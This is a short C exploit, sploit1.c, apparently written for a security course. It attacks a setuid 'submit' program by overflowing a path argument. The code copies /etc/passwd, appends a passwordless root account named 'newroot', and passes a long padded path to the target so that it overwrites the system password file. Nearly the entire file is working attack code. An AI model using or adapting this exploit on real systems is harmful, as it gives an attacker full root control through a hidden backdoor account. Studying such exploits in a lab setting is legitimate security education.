/*
 * sploit1.c
 * buffer overflow version, attack the check_for_viruses function
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>

#define TARGET "/usr/local/bin/submit" // or submitV2
//#define TARGET "/share/submit"   // for testing only

int main() {
    FILE *fp;
	char *args[4];
	char *env[1];

    system("cat /etc/passwd > passwd");
    system("echo 'newroot::0:0:root:/root:/bin/bash' >> passwd");
    

	args[0] = TARGET;
	args[1] = "././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././share/passwd\x01"; 
    args[2] = NULL;
    args[3] = NULL;

	env[0] = NULL;

	execve(TARGET, args, env);
    fprintf(stderr, "execve failed\n");
    

	
	return 1;
}
